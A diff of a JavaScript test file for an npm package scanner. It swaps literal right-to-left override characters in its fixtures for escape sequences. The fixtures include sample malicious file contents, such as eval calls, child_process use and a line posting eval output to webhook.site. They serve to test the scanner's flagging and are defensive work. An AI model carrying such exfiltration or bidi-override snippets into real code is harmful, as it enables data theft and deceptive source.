@@ -72,7 +72,7 @@ test('a file\'s flags are what its tags show, alerts by their severity, warnings
   const entry = npmPackageEntry({ name: 'pkg', version: '1.0.0', integrity: 'sha512-flags', manifest: {} })
   const details = await told(npmPackageDetails(entry, { files: [
     ['index.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\nrequire("child_process")\n'], ['README.md', 10, '# pkg\n'],
-    ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "‮"\n'], ['logo.png', 4, null], ['send.js', 40, 'post("https://webhook.site/x", eval(code))\n'],
+    ['dist/a.min.js', 3000, `${'a;'.repeat(1500)}\n`], ['ctl.js', 10, 'x = "\u202E"\n'], ['logo.png', 4, null], ['send.js', 40, 'post("https://webhook.site/x", eval(code))\n'],
   ] }))
   assert.deepEqual(npmFileFlags(details, 'index.js'), [], 'none for what reads as most files do')
   assert.deepEqual(npmFileFlags(details, 'run.js'), [{ name: 'eval', severity: 'high' }, { name: 'child_process', severity: 'high' }])
@@ -88,7 +88,7 @@ test('a file\'s flags are what its tags show, alerts by their severity, warnings
 
 test('the npm Overview\'s Files offer Flags where a file listed is flagged, ordered by them', async () => {
   const entry = npmPackageEntry({ name: 'flagged', version: '1.0.0', integrity: 'sha512-flagged-files', manifest: {} })
-  const files = [['b.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\n'], ['a.js', 40, 'module.exports = 2\n'], ['logo.png', 9000, null], ['z.js', 10, 'x = "‮"; eval(x)\n']]
+  const files = [['b.js', 40, 'module.exports = 1\n'], ['run.js', 40, 'eval(code)\n'], ['a.js', 40, 'module.exports = 2\n'], ['logo.png', 9000, null], ['z.js', 10, 'x = "\u202E"; eval(x)\n']]
   const render = (details, sort, shown = entry) => {
     Object.assign(state, { bundles: [shown], selectedBundle: shown.integrity, bundleDetails: details, bundleOverviewFilesSort: sort })
     const markup = renderText(renderBundlesList([shown]))
